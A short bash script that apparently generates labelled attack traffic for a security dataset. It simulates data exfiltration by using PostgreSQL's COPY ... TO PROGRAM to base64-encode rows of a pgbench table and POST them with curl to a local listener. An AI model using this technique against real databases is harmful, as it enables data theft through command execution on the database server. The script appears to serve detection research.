#!/bin/bash
echo "Simulating Data Exfiltration Attack (base64 + curl)..."
/dataset_workspace/logger.sh mark_attack "attack_exfil_base64_curl" start
psql -U postgres -d casce_tpcb -c "COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'base64 > /tmp/exfil_base64_curl.dat && curl -s -X POST -d @/tmp/exfil_base64_curl.dat http://127.0.0.1:9090 2>/dev/null || true';"
/dataset_workspace/logger.sh mark_attack "attack_exfil_base64_curl" end
